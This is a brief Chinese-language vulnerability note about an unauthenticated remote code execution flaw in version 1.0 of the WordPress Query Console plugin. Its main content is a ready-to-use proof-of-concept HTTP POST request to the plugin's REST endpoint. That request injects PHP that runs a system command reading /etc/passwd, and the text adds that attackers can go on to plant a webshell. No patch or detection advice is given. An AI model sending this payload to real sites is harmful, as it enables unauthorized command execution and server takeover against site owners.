# WordPress插件query-console存在未授权RCE漏洞

WordPress Query Console插件1.0版本存在安全缺陷问题，未经身份验证的远程攻击者可利用此插件执行任意PHP代码，调用系统命令可直接造成RCE,植入webshell将进一步获取服务器权限

## poc

```javascript
POST /wp-json/wqc/v1/query HTTP/1.1
Host: 
Accept: */*
Content-Type: application/json
Accept-Encoding: gzip, deflate
Priority: u=0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

{"queryArgs":"system('cat /etc/passwd')","queryType":"WP_Query"}
```

